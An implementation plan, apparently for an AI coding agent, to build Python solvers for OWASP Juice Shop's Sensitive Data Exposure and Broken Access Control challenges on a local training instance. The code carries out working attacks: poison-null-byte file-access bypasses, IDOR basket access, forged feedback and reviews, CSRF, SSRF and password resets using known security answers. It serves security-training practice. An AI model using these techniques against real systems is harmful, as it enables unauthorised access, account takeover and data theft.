# Juice Shop Automator — Phase 2 (Sensitive Data Exposure + Broken Access Control) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Extend the existing Juice Shop automator (framework already built and merged in
Phase 1) to solve Sensitive Data Exposure (16 challenges) and Broken Access Control
(11 of 12 — `aiDebuggingChallenge` deferred, see below) — 27 of the 28 challenges
originally planned for Phase 2.

**Architecture:** Same as Phase 1 — new solver modules registered via
`solvers.base.register`, consuming `core.client.JuiceShopClient` /
`solvers.base.SolverContext`, executed by the existing `core.runner.run_all` and
verified against the live `/api/Challenges/` endpoint. No framework changes needed
except one new dependency (`eth-account`, for `nftUnlockChallenge`'s BIP44 wallet
derivation).

**Tech Stack:** Python 3.11+, `requests` (existing), `eth-account` (new — mnemonic
→ Ethereum private key derivation, matching `ethers.js`' default `m/44'/60'/0'/0/0`
path used server-side).

## Global Constraints

- Target instance: `http://localhost:3000`, started via `npm start`, never Docker
  (same as Phase 1).
- No mocking. A solver is only considered done when `runner.py` observes
  `solved: true` for its key from the live `/api/Challenges/` endpoint.
- Every solver is isolated: an exception in one must not stop the others (already
  guaranteed by `core.runner.run_all`).
- Email domain for all seeded accounts is `juice-sh.op`.
- **Known deviation from the original design spec:** `aiDebuggingChallenge`
  (Broken Access Control) requires the chatbot to actually invoke a tool via a real
  LLM backend (`routes/chat.ts` — same `streamText`/tool-call mechanism as the 3
  chatbot challenges already excluded in Phase 1, and the server logs the same
  "will not work as intended without access to `http://localhost:11434/v1`"
  warning for it at startup). This wasn't caught during the original scope
  estimate. It's deferred alongside the other LLM-dependent challenges, not solved
  in this phase. Phase 2 therefore delivers 27, not 28; overall target becomes 109,
  not 110.
- Verified directly against the Juice Shop 2026 `master` source (`routes/checkKeys.ts`,
  `routes/currentUser.ts`, `routes/dataExport.ts`, `routes/fileServer.ts`,
  `routes/login.ts`, `routes/resetPassword.ts`, `routes/verify.ts`, `routes/basket.ts`,
  `routes/basketItems.ts`, `routes/createProductReviews.ts`, `routes/order.ts`,
  `routes/updateUserProfile.ts`, `routes/profileImageUrlUpload.ts`, `models/user.ts`,
  `models/product.ts`, `data/datacreator.ts`, `data/static/users.yml`,
  `config/default.yml`, `server.ts`) fetched on 2026-08-09 — endpoints, field names,
  config-driven values (security answers, overwrite URLs, keyword lists, the
  blueprint filename) are taken directly from that source, not guessed.

---

### Task 1: Sensitive Data Exposure solvers (16 challenges)

**Files:**
- Create: `solvers/sensitive_data.py`
- Test: `tests/test_sensitive_data_live.py`
- Modify: `requirements.txt` (add `eth-account>=0.13`)

**Interfaces:**
- Consumes `solvers.base.register`, `SolverContext`, `JuiceShopClient` from Task 1
  of Phase 1 (already built).
- Produces 16 registered solvers under category `"Sensitive Data Exposure"`.

- [ ] **Step 1: Add the new dependency**

```
# requirements.txt — append this line
eth-account>=0.13
```

- [ ] **Step 2: Write `solvers/sensitive_data.py`**

```python
"""Sensitive Data Exposure category solvers (16 of 16). Verified against
routes/checkKeys.ts, routes/currentUser.ts, routes/dataExport.ts,
routes/fileServer.ts, routes/login.ts, routes/resetPassword.ts,
routes/verify.ts, data/datacreator.ts, data/static/users.yml, and
config/default.yml (fetched 2026-08-09)."""
import uuid

from eth_account import Account

from core.client import JuiceShopClient
from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"

Account.enable_unaudited_hdwallet_features()


# --- routes/checkKeys.ts: derives an Ethereum wallet from a hardcoded BIP39
# mnemonic via ethers' HDNodeWallet.fromPhrase(), which uses the default
# derivation path m/44'/60'/0'/0/0 — eth-account's Account.from_mnemonic()
# uses the identical default path, so it reproduces the exact same private
# key. Just needs the "0x" prefix ethers always includes. ---

NFT_MNEMONIC = "purpose betray marriage blame crunch monitor spin slide donate sport lift clutch"


@register("nftUnlockChallenge", "Sensitive Data Exposure", 2)
def solve_nft_unlock(ctx: SolverContext) -> None:
    acct = Account.from_mnemonic(NFT_MNEMONIC)
    private_key = "0x" + acct.key.hex().removeprefix("0x")
    ctx.client.post("/rest/web3/submitKey", json={"privateKey": private_key}).raise_for_status()


# --- routes/currentUser.ts: GET /rest/user/whoami with ?fields=password
# returns the password hash in the response body (a field allowlist that
# doesn't exclude "password"); the same endpoint with any ?callback= param
# switches to JSONP, which unconditionally solves emailLeakChallenge. ---

@register("passwordHashLeakChallenge", "Sensitive Data Exposure", 2)
def solve_password_hash_leak(ctx: SolverContext) -> None:
    email = f"pwhash.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.get("/rest/user/whoami", params={"fields": "password"}).raise_for_status()


@register("emailLeakChallenge", "Sensitive Data Exposure", 5)
def solve_email_leak(ctx: SolverContext) -> None:
    ctx.client.get("/rest/user/whoami", params={"callback": "cb"}).raise_for_status()


# --- routes/fileServer.ts: files under /ftp are allowlisted to .md/.pdf (or
# the literal "incident-support.kdbx") *before* a poison-null-byte ("%00" as
# a literal 3-char substring, not a real NUL — cutOffPoisonNullByte does a
# plain string search) truncates the name. Appending "%2500.md" to a real
# filename passes the allowlist check as ".md", then truncates back to the
# real (non-.md) file. acquisitions.md itself needs no bypass — it's just
# not linked from the UI. ---

@register("directoryListingChallenge", "Sensitive Data Exposure", 1)
def solve_directory_listing(ctx: SolverContext) -> None:
    ctx.client.get("/ftp/acquisitions.md").raise_for_status()


@register("forgottenDevBackupChallenge", "Sensitive Data Exposure", 4)
def solve_forgotten_dev_backup(ctx: SolverContext) -> None:
    ctx.client.get("/ftp/package.json.bak%2500.md").raise_for_status()


@register("forgottenBackupChallenge", "Sensitive Data Exposure", 4)
def solve_forgotten_backup(ctx: SolverContext) -> None:
    ctx.client.get("/ftp/coupons_2013.md.bak%2500.md").raise_for_status()


# --- routes/login.ts verifyPreLoginChallenges: these three fire purely on
# the request body matching a hardcoded email/password pair, regardless of
# whether the login itself succeeds. mc.safesearch and amy are real seeded
# users (data/static/users.yml); "testing" isn't seeded at all — irrelevant,
# since the challenge check runs before the DB lookup. ---

@register("loginRapperChallenge", "Sensitive Data Exposure", 2)
def solve_login_rapper(ctx: SolverContext) -> None:
    ctx.client.post("/rest/user/login", json={"email": f"mc.safesearch@{DOMAIN}", "password": "Mr. N00dles"})


@register("loginAmyChallenge", "Sensitive Data Exposure", 3)
def solve_login_amy(ctx: SolverContext) -> None:
    ctx.client.post("/rest/user/login", json={"email": f"amy@{DOMAIN}", "password": "K1f....................."})


@register("exposedCredentialsChallenge", "Sensitive Data Exposure", 2)
def solve_exposed_credentials(ctx: SolverContext) -> None:
    ctx.client.post("/rest/user/login", json={"email": f"testing@{DOMAIN}", "password": "IamUsedForTesting"})


# --- routes/dataExport.ts: orders are looked up by the *masked* email
# (vowels replaced with '*'), the same masking routes/order.ts applies when
# storing an order's owner. Two accounts whose real emails mask to the same
# string (e.g. "0000####" vs "1111####" — no vowels in either, so nothing
# gets masked and they collide only if literally identical; using an
# all-consonant-and-digit shared suffix with an all-vowel prefix on one and
# no vowels on the other guarantees a collision without relying on random
# hex letters). Placing an order as one account then exporting data as the
# other leaks the first account's order (its orderId prefix — hash(email)
# truncated to 4 chars — won't match the exporter's own email hash). ---

@register("dataExportChallenge", "Sensitive Data Exposure", 4)
def solve_data_export(ctx: SolverContext) -> None:
    suffix = f"{uuid.uuid4().int % 100000000:08d}"  # digits only, no vowel ambiguity
    victim_email = f"aaaa{suffix}@{DOMAIN}"
    attacker_email = f"eeee{suffix}@{DOMAIN}"  # masks to the identical "****{suffix}@..."

    ctx.client.register(victim_email, "Test1234!")
    victim_login = ctx.client.login(victim_email, "Test1234!")
    victim_bid = victim_login.json()["authentication"]["bid"]
    products = ctx.client.get("/rest/products/search", params={"q": ""}).json()["data"]
    product_id = products[0]["id"]
    ctx.client.post("/api/BasketItems", json={"ProductId": product_id, "BasketId": victim_bid, "quantity": 1}).raise_for_status()
    ctx.client.post(f"/rest/basket/{victim_bid}/checkout").raise_for_status()

    attacker_client = JuiceShopClient(ctx.base_url)
    attacker_client.register(attacker_email, "Test1234!")
    attacker_client.login(attacker_email, "Test1234!")
    my_id = attacker_client.get("/rest/user/whoami").json()["user"]["id"]
    attacker_client.post("/rest/user/data-export", json={"UserId": my_id}).raise_for_status()


# --- routes/verify.ts databaseRelatedChallenges (mounted with app.use(),
# i.e. runs on *every* request): dlpPastebinDataLeakChallenge solves when a
# single Feedback or Complaint message contains ALL keywords from
# config.default.yml's one product with keywordsForPastebinDataLeakChallenge
# ("hueteroneel" and "eurogium edule"); leakedApiKeyChallenge solves the same
# way for one hardcoded fake API key substring. Both just need a POST to
# /api/Complaints (no captcha there, unlike /api/Feedbacks) containing the
# right text — checked on the *next* request after submission. ---

@register("dlpPastebinDataLeakChallenge", "Sensitive Data Exposure", 4)
def solve_dlp_pastebin_leak(ctx: SolverContext) -> None:
    email = f"dlp.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/api/Complaints",
        json={"message": "Product contains hueteroneel and eurogium edule, unsafe!"},
    ).raise_for_status()


@register("leakedApiKeyChallenge", "Sensitive Data Exposure", 5)
def solve_leaked_api_key(ctx: SolverContext) -> None:
    email = f"apikey.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/api/Complaints",
        json={"message": "Found a leaked key: 6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie in our repo!"},
    ).raise_for_status()


# --- routes/verify.ts accessControlChallenges, mounted on
# /assets/public/images/products: solved the instant a request for the
# blueprint file arrives that wasn't triggered by the actual UI (no
# `referer` header — true by default for a plain HTTP client). The filename
# itself (JuiceShop.stl) comes from config.default.yml's one product with
# fileForRetrieveBlueprintChallenge. ---

@register("retrieveBlueprintChallenge", "Sensitive Data Exposure", 5)
def solve_retrieve_blueprint(ctx: SolverContext) -> None:
    ctx.client.get("/assets/public/images/products/JuiceShop.stl").raise_for_status()


# --- routes/resetPassword.ts verifySecurityAnswerChallenges: real seeded
# security-question answer for uvogin (data/static/users.yml). ---

@register("resetPasswordUvoginChallenge", "Sensitive Data Exposure", 4)
def solve_reset_password_uvogin(ctx: SolverContext) -> None:
    ctx.client.post(
        "/rest/user/reset-password",
        json={"email": f"uvogin@{DOMAIN}", "answer": "Silence of the Lambs", "new": "NewUvoginPassword1!", "repeat": "NewUvoginPassword1!"},
    ).raise_for_status()


# --- routes/resetPassword.ts verifySecurityAnswerChallenges: these two
# don't check a per-user security-question answer at all — they check
# against config.default.yml's memories[].geoStalkingMetaSecurityAnswer /
# geoStalkingVisualSecurityAnswer ("Daniel Boone National Forest" and
# "ITsec" under the default config profile), for John and Emma respectively. ---

@register("geoStalkingMetaChallenge", "Sensitive Data Exposure", 2)
def solve_geo_stalking_meta(ctx: SolverContext) -> None:
    ctx.client.post(
        "/rest/user/reset-password",
        json={"email": f"john@{DOMAIN}", "answer": "Daniel Boone National Forest", "new": "NewJohnPassword1!", "repeat": "NewJohnPassword1!"},
    ).raise_for_status()


@register("geoStalkingVisualChallenge", "Sensitive Data Exposure", 2)
def solve_geo_stalking_visual(ctx: SolverContext) -> None:
    ctx.client.post(
        "/rest/user/reset-password",
        json={"email": f"emma@{DOMAIN}", "answer": "ITsec", "new": "NewEmmaPassword1!", "repeat": "NewEmmaPassword1!"},
    ).raise_for_status()
```

- [ ] **Step 3: Write the live verification test**

```python
# tests/test_sensitive_data_live.py
"""No mocking, per project convention: runs the real solvers against a live
Juice Shop instance and checks the live score-board."""
import pytest

import solvers.sensitive_data  # noqa: F401 - registers the solvers
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

SENSITIVE_DATA_KEYS = [
    "nftUnlockChallenge", "passwordHashLeakChallenge", "emailLeakChallenge",
    "directoryListingChallenge", "forgottenDevBackupChallenge", "forgottenBackupChallenge",
    "loginRapperChallenge", "loginAmyChallenge", "exposedCredentialsChallenge",
    "dataExportChallenge", "dlpPastebinDataLeakChallenge", "leakedApiKeyChallenge",
    "retrieveBlueprintChallenge", "resetPasswordUvoginChallenge",
    "geoStalkingMetaChallenge", "geoStalkingVisualChallenge",
]


def test_all_sensitive_data_challenges_solved():
    results = run_all(categories=["Sensitive Data Exposure"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in SENSITIVE_DATA_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

- [ ] **Step 4: Install the new dependency and run the live test**

```bash
pip install -r requirements.txt
pytest tests/test_sensitive_data_live.py -v
```

Expected: PASS. If `nftUnlockChallenge` fails, print the derived
`private_key`/`address` and cross-check against a real `node -e` call using
`ethers`' `HDNodeWallet.fromPhrase` in the `juice-shop/` checkout (needs
`npm install` there first) — the mnemonic and derivation path are correct per
source, but library version drift is possible. If `dataExportChallenge` fails,
inspect the actual `userData.orders` in the response — confirm the two masked
emails really collided (log both raw emails and their `replace(/[aeiou]/gi,
'*')` forms).

- [ ] **Step 5: Commit**

```bash
git add solvers/sensitive_data.py tests/test_sensitive_data_live.py requirements.txt
git commit -m "feat: solve 16 Sensitive Data Exposure challenges"
```

---

### Task 2: Broken Access Control solvers (11 of 12 — aiDebuggingChallenge deferred)

**Files:**
- Create: `solvers/broken_access_control.py`
- Test: `tests/test_broken_access_control_live.py`

**Interfaces:**
- Consumes `solvers.base.register`, `SolverContext`, `JuiceShopClient` from Phase 1.
- Produces 11 registered solvers under category `"Broken Access Control"`.

- [ ] **Step 1: Write `solvers/broken_access_control.py`**

```python
"""Broken Access Control category solvers (11 of 12 — aiDebuggingChallenge
needs a real LLM tool-call via routes/chat.ts and is deferred, same as the 3
chatbot challenges excluded in Phase 1). Verified against routes/verify.ts,
routes/basket.ts, routes/basketItems.ts, routes/createProductReviews.ts,
routes/updateUserProfile.ts, routes/profileImageUrlUpload.ts, server.ts, and
config/default.yml (fetched 2026-08-09)."""
import uuid

from core.client import JuiceShopClient
from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/verify.ts accessControlChallenges, mounted on
# /assets/public/images/padding: solved by requesting the numbered tracking
# pixel directly, as long as the request wasn't triggered by real browser
# navigation (`sec-fetch-dest: document` header or a `referer` header — a
# plain HTTP client sends neither by default, so `uiBypassed` is true). ---

@register("web3SandboxChallenge", "Broken Access Control", 1)
def solve_web3_sandbox(ctx: SolverContext) -> None:
    ctx.client.get("/assets/public/images/padding/11px.png").raise_for_status()


@register("adminSectionChallenge", "Broken Access Control", 2)
def solve_admin_section(ctx: SolverContext) -> None:
    ctx.client.get("/assets/public/images/padding/19px.png").raise_for_status()


# --- routes/fileServer.ts verifySuccessfulPoisonNullByteExploit: same
# poison-null-byte technique as forgottenDevBackupChallenge in Task 1
# (Sensitive Data Exposure) — this one's just categorized as Broken Access
# Control instead because the file being reached (a hidden game easter egg)
# isn't "sensitive data" per se. ---

@register("easterEggLevelOneChallenge", "Broken Access Control", 4)
def solve_easter_egg_level_one(ctx: SolverContext) -> None:
    ctx.client.get("/ftp/eastere.gg%2500.md").raise_for_status()


# --- routes/verify.ts databaseRelatedChallenges (feedbackChallenge()):
# solved when the count of rating=5 Feedback rows is zero. The seeded admin
# account (data/static/users.yml) has one rating-5 feedback. DELETE
# /api/Feedbacks/:id only requires *any* authenticated user
# (security.isAuthorized(), no ownership check) — that's the access-control
# bug. Checked again on the very next request after the deletes. ---

@register("feedbackChallenge", "Broken Access Control", 2)
def solve_feedback(ctx: SolverContext) -> None:
    email = f"delfive.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    resp = ctx.client.get("/api/Feedbacks")
    resp.raise_for_status()
    for feedback in resp.json().get("data", []):
        if feedback.get("rating") == 5:
            ctx.client.session.delete(ctx.client._url(f"/api/Feedbacks/{feedback['id']}")).raise_for_status()
    ctx.client.get("/api/Feedbacks")  # any request re-triggers the global databaseRelatedChallenges check


# --- routes/verify.ts forgedFeedbackChallenge middleware: solved when
# POST /api/Feedbacks carries a `UserId` that doesn't match the actual
# caller (mismatched even when nobody is logged in, since then the caller's
# own id is undefined and any truthy UserId satisfies "!="). Anonymous POST
# is explicitly allowed by server.ts; still needs a fresh captcha like any
# /api/Feedbacks POST. ---

@register("forgedFeedbackChallenge", "Broken Access Control", 3)
def solve_forged_feedback(ctx: SolverContext) -> None:
    captcha = ctx.client.get("/rest/captcha").json()
    ctx.client.post(
        "/api/Feedbacks",
        json={
            "UserId": 1,
            "comment": "forged feedback",
            "rating": 3,
            "captchaId": captcha["captchaId"],
            "captcha": captcha["answer"],
        },
    ).raise_for_status()


# --- routes/createProductReviews.ts: solved the instant a review is
# created whose `author` field differs from the actually-authenticated
# user's email — the endpoint trusts the client-supplied author outright. ---

@register("forgedReviewChallenge", "Broken Access Control", 3)
def solve_forged_review(ctx: SolverContext) -> None:
    email = f"forgerev.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    products = ctx.client.get("/rest/products/search", params={"q": ""}).json()["data"]
    product_id = products[0]["id"]
    ctx.client.put(
        f"/rest/products/{product_id}/reviews",
        json={"message": "forged review", "author": f"someone.else@{DOMAIN}"},
    ).raise_for_status()


# --- routes/basketItems.ts addBasketItem: solved as soon as an added
# basket item's BasketId doesn't match the authenticated user's own basket
# id. The endpoint's *first* guard only rejects when BasketId is literally
# missing/"undefined" here we always pass a real (just wrong) id, so the
# check that matters is the solveIf right after, not that guard. ---

@register("basketManipulateChallenge", "Broken Access Control", 3)
def solve_basket_manipulate(ctx: SolverContext) -> None:
    email = f"basketman.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    login_resp = ctx.client.login(email, "Test1234!")
    bid = login_resp.json()["authentication"]["bid"]
    products = ctx.client.get("/rest/products/search", params={"q": ""}).json()["data"]
    product_id = products[0]["id"]
    add_resp = ctx.client.post("/api/BasketItems", json={"ProductId": product_id, "BasketId": bid, "quantity": 1})
    add_resp.raise_for_status()
    item_id = add_resp.json()["data"]["id"]
    ctx.client.put(f"/api/BasketItems/{item_id}", json={"BasketId": bid + 999}).raise_for_status()


# --- routes/basket.ts retrieveBasket: solved by requesting a basket id
# that isn't the authenticated user's own — a plain IDOR, no ownership
# check on the read path. ---

@register("basketAccessChallenge", "Broken Access Control", 2)
def solve_basket_access(ctx: SolverContext) -> None:
    email = f"basketacc.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    login_resp = ctx.client.login(email, "Test1234!")
    bid = login_resp.json()["authentication"]["bid"]
    ctx.client.get(f"/rest/basket/{bid + 999}").raise_for_status()


# --- routes/updateUserProfile.ts: solved by POSTing /profile with an
# `Origin` (or `Referer`) header containing
# config.default.yml's overwriteUrlForCsrfChallenge
# ("http://htmledit.squarefree.com") and a `username` different from the
# current one — simulating a cross-site form post. ---

@register("csrfChallenge", "Broken Access Control", 3)
def solve_csrf(ctx: SolverContext) -> None:
    email = f"csrf.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/profile",
        data={"username": f"csrfed-{uuid.uuid4().hex[:6]}"},
        headers={"Origin": "http://htmledit.squarefree.com"},
    ).raise_for_status()


# --- routes/profileImageUrlUpload.ts + routes/verify.ts serverSideChallenges
# (the same /solve/challenges/server-side endpoint sstiChallenge used in
# Phase 1): setting a profile image URL whose text contains
# "solve/challenges/server-side" flips req.app.locals.abused_ssrf_bug
# (unconditionally, before the server even tries to fetch it), then a
# request to that same endpoint with the fixed key solves ssrfChallenge if
# the flag is set. ---

@register("ssrfChallenge", "Broken Access Control", 6)
def solve_ssrf(ctx: SolverContext) -> None:
    email = f"ssrf.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/profile/image/url", data={"imageUrl": f"{ctx.base_url}/solve/challenges/server-side"})
    ctx.client.get(
        "/solve/challenges/server-side",
        params={"key": "tRy_H4rd3r_n0thIng_iS_Imp0ssibl3"},
    ).raise_for_status()


# --- routes/verify.ts changeProductChallenge (databaseRelatedChallenges):
# solved when the O-Saft product's description no longer contains its
# original urlForProductTamperingChallenge text but does contain an anchor
# tag pointing at config.default.yml's overwriteUrlForProductTamperingChallenge
# ("https://owasp.slack.com"). Overwriting via PUT /api/Products/:id (same
# pattern as restfulXssChallenge in Phase 1). Checked on the next request
# after the update. ---

@register("changeProductChallenge", "Broken Access Control", 3)
def solve_change_product(ctx: SolverContext) -> None:
    email = f"tamper.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    products = ctx.client.get("/rest/products/search", params={"q": "O-Saft"}).json()["data"]
    product_id = products[0]["id"]
    ctx.client.put(
        f"/api/Products/{product_id}",
        json={"description": '<a href="https://owasp.slack.com" target="_blank">More...</a>'},
    ).raise_for_status()
    ctx.client.get("/rest/products/search", params={"q": "O-Saft"})  # re-trigger the periodic check
```

- [ ] **Step 2: Write the live verification test**

```python
# tests/test_broken_access_control_live.py
import pytest

import solvers.broken_access_control  # noqa: F401
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

BROKEN_ACCESS_CONTROL_KEYS = [
    "web3SandboxChallenge", "adminSectionChallenge", "easterEggLevelOneChallenge",
    "feedbackChallenge", "forgedFeedbackChallenge", "forgedReviewChallenge",
    "basketManipulateChallenge", "basketAccessChallenge", "csrfChallenge",
    "ssrfChallenge", "changeProductChallenge",
]


def test_all_broken_access_control_challenges_solved():
    results = run_all(categories=["Broken Access Control"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in BROKEN_ACCESS_CONTROL_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

- [ ] **Step 3: Run the live test**

```bash
pytest tests/test_broken_access_control_live.py -v
```

Expected: PASS. `feedbackChallenge` and `changeProductChallenge` both depend on
the global `databaseRelatedChallenges` middleware re-running on a *later*
request — if either fails, check whether `core.runner`'s per-solver retry/poll
(already added in Phase 1) is catching it; if not, add one more harmless
follow-up request inside the solver itself before returning. `ssrfChallenge`
depends on the server being able to reach its own `/solve/challenges/server-side`
via `fetch()` — if it fails with a network-looking error, confirm
`ctx.base_url` (`http://localhost:3000`) is reachable from inside the Node
process itself, not just from the test runner.

- [ ] **Step 4: Commit**

```bash
git add solvers/broken_access_control.py tests/test_broken_access_control_live.py
git commit -m "feat: solve 11 of 12 Broken Access Control challenges (aiDebuggingChallenge deferred)"
```

---

### Task 3: Full Phase 2 report run

**Files:**
- No new files — this task runs the assembled CLI end-to-end, and updates
  `main.py`'s solver-import list.

**Interfaces:**
- Consumes everything from Tasks 1–2, plus Phase 1's already-registered categories.

- [ ] **Step 1: Register the two new solver modules in `main.py`**

In `main.py`, alongside the existing `try: import solvers.injection` /
`solvers.xss` / `solvers.broken_auth` block, add:

```python
try:
    import solvers.sensitive_data  # noqa: F401
except ImportError:
    pass
try:
    import solvers.broken_access_control  # noqa: F401
except ImportError:
    pass
```

- [ ] **Step 2: Run the full Phase 1 + Phase 2 slice against a fresh instance**

```bash
python main.py --category Injection --category XSS --category "Broken Authentication" --category "Sensitive Data Exposure" --category "Broken Access Control"
```

Expected output: a report table with `TOTAL: 55/55 solved` (28 from Phase 1 +
27 from Phase 2). If any key is not solved, its `[FAIL]` line includes the
captured HTTP error — fix that specific solver function only, then rerun just
that category with `--category <name>`.

- [ ] **Step 3: Commit**

```bash
git add main.py
git commit -m "chore: Phase 2 (Sensitive Data Exposure + Broken Access Control) complete — 27/27 (55/109 overall)"
```
